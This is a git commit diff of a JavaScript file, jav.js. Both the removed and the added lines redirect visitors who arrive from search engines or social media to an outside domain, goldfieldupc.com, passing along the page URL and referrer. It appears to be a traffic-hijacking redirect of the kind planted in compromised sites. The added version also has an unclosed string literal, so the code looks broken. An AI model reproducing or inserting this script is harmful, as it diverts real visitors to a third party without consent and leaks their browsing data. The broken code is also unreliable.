930bb5906552dac2594bb1f8b5fca1e146bcc148
masanwar89 <74386838+masanwar89@users.noreply.github.com>
2021-06-19 16:36:13 +0700

    Update jav.js

--- jav.js
+++ jav.js
@@ -1,2 +1,12 @@
-var ars = 'https://goldfieldupc.com';
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+//<![CDATA[
+    if(document.referrer)
+    {
+    	var cek = document.referrer;
+    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.') || cek.includes('duckduckgo.');
+      if(is_se)
+    	{
+    		var url = window.location.href;
+    		window.location = "https://goldfieldupc.com/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
+    	}
+    }
+//]]>
